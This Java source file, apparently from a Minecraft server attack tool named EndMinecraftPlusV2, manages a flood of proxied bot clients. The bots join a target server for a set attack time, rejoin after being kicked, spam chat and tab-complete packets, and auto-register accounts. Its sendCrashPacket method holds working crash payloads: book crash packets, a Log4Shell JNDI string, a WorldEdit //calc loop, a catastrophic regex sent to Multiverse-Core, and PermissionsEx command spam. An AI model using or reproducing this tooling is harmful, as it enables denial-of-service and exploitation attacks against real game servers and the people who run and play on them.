package cn.serendipityr.EndMinecraftPlusV2.MultipleVersion.Bot;

import cn.serendipityr.EndMinecraftPlusV2.MultipleVersion.Packet.PacketHandler;
import cn.serendipityr.EndMinecraftPlusV2.MultipleVersion.Packet.PacketManager;
import cn.serendipityr.EndMinecraftPlusV2.MultipleVersion.UniverseMethods;
import cn.serendipityr.EndMinecraftPlusV2.Tools.*;

import java.net.Proxy;
import java.util.Random;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class BotManager {
    public static ConcurrentHashMap<Object, String> clientList = new ConcurrentHashMap<>();
    public static ConcurrentHashMap<Object, String> aliveList = new ConcurrentHashMap<>();
    public static ConcurrentHashMap<Object, Object> positionList = new ConcurrentHashMap<>();
    private static ExecutorService executorService_1 = null;
    private final ExecutorService executorService_2;
    public static BotHandler botHandler = null;
    public static PacketHandler packetHandler = null;
    public static boolean doubleAttack;
    public static int protocolVersion = -1;
    public static int rejoinCount = 0;
    public static int joinedCount = 0;
    public static int failedCount = 0;

    public BotManager(BotHandler bot, PacketHandler packet) {
        executorService_1 = Executors.newFixedThreadPool(ConfigUtil.MaxConnections);
        this.executorService_2 = Executors.newFixedThreadPool(ConfigUtil.MaxConnections);
        botHandler = bot;
        packetHandler = packet;
    }

    public void test() {
        // 获取Bot名称
        String userName = ConfigUtil.DebugPlayer;

        // 创建Bot
        LogUtil.doLog(0, "[DEBUG] [创建Bot]", "BotAttack");
        Object client = botHandler.createClientLocal(userName);
        BotManager.clientList.put(client, userName);
        botHandler.setClientTimeout(client, ConfigUtil.ConnectTimeout);
        LogUtil.doLog(0, "[DEBUG] [连接到服务器]", "BotAttack");
        botHandler.connectLocal(client);

        if (ConfigUtil.DebugPlayerActivities) {
            for (String action : ConfigUtil.DebugPlayerActions) {
                String[] _action = action.split(":");
                switch (_action[0]) {
                    case "wait":
                        long time = Long.parseLong(_action[1]);
                        LogUtil.doLog(0, "[DEBUG] [行动] 等待: " + time + "毫秒", "BotAttack");
                        OtherUtils.doSleep(time);
                        break;
                    case "chat":
                        String msg = _action[1];
                        LogUtil.doLog(0, "[DEBUG] [行动] 尝试发送测试消息: " + msg, "BotAttack");
                        packetHandler.sendChatPacket(client, msg);
                        break;
                    case "randomTeleport":
                        int count = Integer.parseInt(_action[1]);
                        LogUtil.doLog(0, "[DEBUG] [行动] 尝试进行随机传送: " + count + "次", "BotAttack");
                        packetHandler.sendPositionPacketFromPacket(client, positionList.get(client), true);
                        break;
                    case "backTeleport":
                        LogUtil.doLog(0, "[DEBUG] [行动] 尝试回到初始位置。", "BotAttack");
                        packetHandler.sendPositionPacketFromPacket(client, positionList.get(client), false);
                        break;
                    case "register&Login":
                        String pwd = _action[1];
                        LogUtil.doLog(0, "[DEBUG] [行动] 尝试执行注册/登录: " + pwd, "BotAttack");
                        doRegisterLogin(client, userName, 0, false, pwd);
                        break;
                    case "crashPacket":
                        int count_ = Integer.parseInt(_action[1]);
                        LogUtil.doLog(0, "[DEBUG] [行动] 尝试发送崩服数据包: " + count_ + "个", "BotAttack");
                        sendCrashPacket(client, count_);
                        break;
                    default:
                        LogUtil.doLog(0, "[DEBUG] [行动] 无法识别的action语句: " + action, "BotAttack");
                }
            }
        }
    }

    public void startTask(Boolean isDoubleAttack, int protocolVersion) {
        doubleAttack = isDoubleAttack;
        BotManager.protocolVersion = protocolVersion;
        clientList = new ConcurrentHashMap<>();
        aliveList = new ConcurrentHashMap<>();
        positionList = new ConcurrentHashMap<>();
        long startTime = System.currentTimeMillis();

        new Thread(() -> {
            while (System.currentTimeMillis() - startTime < ConfigUtil.AttackTime * 1000) {
                if (!ConfigUtil.isLinux) {
                    SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - BotAttack | 当前连接数: " + clientList.size() + "个 | 失败次数: " + failedCount + "次 | 成功加入: " + joinedCount + "次 | 当前存活: " + aliveList.size() + "个 | 点击验证: " + PacketManager.clickVerifies + "次 | 重进尝试: " + rejoinCount);
                    OtherUtils.doSleep(100);
                } else {
                    LogUtil.doLog(0, "当前连接数: " + clientList.size() + "个 | 失败次数: " + failedCount + "次 | 成功加入: " + joinedCount + "次 | 当前存活: " + aliveList.size() + "个 | 点击验证: " + PacketManager.clickVerifies + "次 | 重进尝试: " + rejoinCount, ConfigUtil.getAttackMethod(ConfigUtil.AttackMethod));
                    OtherUtils.doSleep(5000);
                }
            }
        }).start();

        while (System.currentTimeMillis() - startTime < ConfigUtil.AttackTime * 1000) {
            executorService_1.execute(new botCreateTask());
            OtherUtils.doSleep(ConfigUtil.ConnectDelay);
            new Thread(() -> {
                for (Object client : aliveList.keySet().toArray()) {
                    executorService_2.execute(new botActivitiesTask(client, aliveList.get(client)));
                }
            }).start();
        }
        shutdownAndAwaitTermination(executorService_2);
        shutdownAndAwaitTermination(executorService_1);
    }

    private void shutdownAndAwaitTermination(ExecutorService executorService) {
        executorService.shutdown(); // Disable new tasks from being submitted
        try {
            // Wait a while for existing tasks to terminate
            if (!executorService.awaitTermination(60, TimeUnit.SECONDS)) {
                executorService.shutdownNow(); // Cancel currently executing tasks
                // Wait a while for tasks to respond to being cancelled
                if (!executorService.awaitTermination(60, TimeUnit.SECONDS))
                    LogUtil.doLog(1, "Executor did not terminate", null);
            }
        } catch (InterruptedException ie) {
            // (Re-)Cancel if current thread also interrupted
            executorService.shutdownNow();
            // Preserve interrupt status
            Thread.currentThread().interrupt();
        }
    }

    private static class botCreateTask implements Runnable {
        @Override
        public void run() {
            // 获取对应代理（一号一个）
            Proxy.Type proxyType = UniverseMethods.getProxyType(ConfigUtil.ProxyType);
            Proxy proxy = UniverseMethods.getProxy(proxyType);

            // 获取Bot名称
            String[] user = UniverseMethods.getRandomUser().split("@");
            String userName = user[0];

            // 创建Bot
            Object client = botHandler.createClient(proxy, userName);
            BotManager.clientList.put(client, userName);
            botHandler.setClientTimeout(client, ConfigUtil.ConnectTimeout);

            // 连接到服务器
            if (!doubleAttack && ConfigUtil.GetMotdBeforeRejoin) {
                for (int i = 0; i < ConfigUtil.GetMotdCount; i++) {
                    try {
                        new UniverseMethods().getMotd(proxy, ConfigUtil.AttackAddress, ConfigUtil.AttackPort);
                    } catch (Throwable ignored) {
                    }
                    OtherUtils.doSleep(ConfigUtil.GetMotdDelay);
                }
            }
            botHandler.connect(client, proxy);

            while (botHandler.checkClientStatus(client)) {
                OtherUtils.doSleep(1000);
            }

            // 处理连接断开
            String disconnectMsg = botHandler.getClientDisconnectMsg(client);
            executorService_1.execute(new botRejoinTask(disconnectMsg, proxy, userName, BotManager.doubleAttack)); // 重连尝试
            clientList.remove(client);
        }
    }

    private static class botActivitiesTask implements Runnable {
        private final Object client;
        private final String userName;

        public botActivitiesTask(Object client, String userName) {
            this.client = client;
            this.userName = userName;
        }

        @Override
        public void run() {
            for (String action : ConfigUtil.BotActions) {
                boolean async = "async".equals(action.split("\\|")[0]);

                String[] _action;
                if (async) {
                    _action = action.split("\\|")[1].split(":");
                    new Thread(() -> runBotAction(client, userName, action, _action)).start();
                } else {
                    _action = action.split(":");
                    runBotAction(client, userName, action, _action);
                }
            }
        }
    }

    private static void runBotAction(Object client, String userName, String action, String[] _action) {
        switch (_action[0]) {
            case "wait":
                long waitTime = Long.parseLong(_action[1]);
                LogUtil.doLog(0, "[" + userName + "] [行动] 等待: " + waitTime + "毫秒", "BotAttack");
                OtherUtils.doSleep(waitTime);
                break;
            case "chatSpam":
                String[] spamArgs = _action[1].split("_");
                int chatCount = Integer.parseInt(spamArgs[0]);
                long chatDelay = Long.parseLong(spamArgs[1]);
                LogUtil.doLog(0, "[" + userName + "] [行动] 尝试向服务器发送消息: " + chatCount + "次", "BotAttack");
                for (int i = 0; i < chatCount; i++) {
                    OtherUtils.doSleep(chatDelay);
                    packetHandler.sendChatPacket(client, UniverseMethods.getRandMessage(userName));
                }
                break;
            case "randomTeleport":
                String[] rndTpArgs = _action[1].split("_");
                int rndTpCount = Integer.parseInt(rndTpArgs[0]);
                long rndTpDelay = Integer.parseInt(rndTpArgs[1]);
                LogUtil.doLog(0, "[" + userName + "] [行动] 尝试进行随机传送: " + rndTpCount + "次", "BotAttack");
                for (int i = 0; i < rndTpCount; i++) {
                    packetHandler.sendPositionPacketFromPacket(client, positionList.get(client), true);
                    OtherUtils.doSleep(rndTpDelay);
                }
                break;
            case "backTeleport":
                LogUtil.doLog(0, "[" + userName + "] [行动] 尝试回到初始位置。", "BotAttack");
                packetHandler.sendPositionPacketFromPacket(client, positionList.get(client), false);
                break;
            case "register&Login":
                String[] loginArgs = _action[1].split("_");
                String flag = loginArgs[0];
                boolean randomPwd = Boolean.parseBoolean(loginArgs[1]);
                String pwd = loginArgs[2];
                if (!botHandler.hasClientFlag(client, flag)) {
                    LogUtil.doLog(0, "[" + userName + "] [行动] 尝试执行注册/登录: " + pwd, "BotAttack");
                    doRegisterLogin(client, userName, 0, randomPwd, pwd);
                    botHandler.setClientFlag(client, flag);
                }
                break;
            case "crashPacket":
                int packetCount = Integer.parseInt(_action[1]);
                LogUtil.doLog(0, "[" + userName + "] [行动] 尝试发送崩服数据包: " + packetCount + "个", "BotAttack");
                sendCrashPacket(client, packetCount);
                break;
            case "tabAttack":
                String[] tabArgs = _action[1].split("_");
                int tabCount = Integer.parseInt(tabArgs[0]);
                long tabDelay = Long.parseLong(tabArgs[1]);
                LogUtil.doLog(0, "[" + userName + "] [行动] 尝试发送命令补全数据包: " + tabCount + "个", "BotAttack");
                for (int i = 0; i < tabCount; i++) {
                    packetHandler.sendTabCompletePacket(client, "/");
                    OtherUtils.doSleep(tabDelay);
                }
            default:
                LogUtil.doLog(0, "[" + userName + "] [行动] 无法识别的action语句: " + action, "BotAttack");
        }
    }

    private static class botRejoinTask implements Runnable {
        private final String disconnectMsg;
        private final String userName;
        private final Proxy proxy;
        private final boolean doubleAttack;

        public botRejoinTask(String disconnectMsg, Proxy proxy, String userName, boolean doubleAttack) {
            this.disconnectMsg = disconnectMsg;
            this.proxy = proxy;
            this.userName = userName;
            this.doubleAttack = doubleAttack;
        }

        @Override
        public void run() {
            if (doubleAttack || disconnectMsg == null) {
                return;
            }

            boolean rejoin = false;

            if (ConfigUtil.EmptyMsgRejoin && disconnectMsg.trim().isEmpty()) {
                rejoin = true;
            } else {
                for (String rejoinDetect : ConfigUtil.RejoinDetect) {
                    if (disconnectMsg.contains(rejoinDetect)) {
                        rejoin = true;
                        break;
                    }
                }
            }

            if (rejoin) {
                for (int i = 0; i < ConfigUtil.RejoinCount; i++) {
                    rejoinCount++;

                    // 创建Bot
                    Object client = botHandler.createClient(proxy, userName);
                    BotManager.clientList.put(client, userName);
                    botHandler.setClientTimeout(client, ConfigUtil.ConnectTimeout);
                    botHandler.connect(client, proxy);

                    while (botHandler.checkClientStatus(client)) {
                        OtherUtils.doSleep(1000);
                    }

                    // 处理连接断开
                    String failMsg = botHandler.getClientDisconnectMsg(client);
                    clientList.remove(client);

                    LogUtil.doLog(0, "[假人重连失败] [" + userName + "] [" + proxy + "] " + failMsg, "BotAttack");

                    OtherUtils.doSleep(ConfigUtil.RejoinDelay);
                }
            }
        }
    }

    public static void doRegisterLogin(Object client, String userName, long delay, boolean randomPassword, String password) {
        botHandler.setClientFlag(client, "login");
        new Thread(() -> {
            for (String text : ConfigUtil.RegisterCommands) {
                OtherUtils.doSleep(delay);
                String cmd = text;
                if (randomPassword) {
                    cmd = cmd.replace("$pwd", DataUtil.botRegPasswordsMap.get(userName));
                } else {
                    cmd = cmd.replace("$pwd", password);
                }
                cmd = cmd.replace("$userName", userName);
                cmd = cmd.replace("$rnd", OtherUtils.getRandomString(4, 6));
                LogUtil.doLog(0, "[" + userName + "] 注册信息已发送。", "BotAttack");
                packetHandler.sendChatPacket(client, cmd);
            }
        }).start();
    }

    public static void sendCrashPacket(Object client, int count) {
        switch (ConfigUtil.ServerCrasherMode) {
            case 1:
                if (protocolVersion <= 340 && protocolVersion != -1) {
                    new Thread(() -> {
                        for (int i = 0; i < count; i++) {
                            packetHandler.sendCrashBookPacket(client);
                            OtherUtils.doSleep(ConfigUtil.ServerCrasherPacketDelay);
                        }
                    }).start();
                } else {
                    LogUtil.doLog(0, "Book Crash仅适用于1.12.2之前的版本。", "ServerCrasher");
                }
                break;
            case 2:
                String log4jExploit = "${jndi:ldap://192.168.${RandomUtils.nextInt(1,253)}.${RandomUtils.nextInt(1,253)}}";
                packetHandler.sendChatPacket(client, log4jExploit);
                break;
            case 3:
                String worldEdit = "//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<255;c++){}}}}";
                packetHandler.sendChatPacket(client, worldEdit);
                break;
            case 4:
                String multiverseCore = "/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^";
                packetHandler.sendChatPacket(client, multiverseCore);
                break;
            case 5:
                String pex_1 = "/pex promote a a";
                String pex_2 = "/pex demote a a";
                new Thread(() -> {
                    for (int i = 0; i < count; i++) {
                        packetHandler.sendChatPacket(client, new Random().nextBoolean() ? pex_1 : pex_2);
                        OtherUtils.doSleep(ConfigUtil.ServerCrasherPacketDelay);
                    }
                }).start();
                break;
            default:
                LogUtil.doLog(1, "ServerCrasher Mode设置有误，请检查配置文件。", null);
                break;
        }
    }
}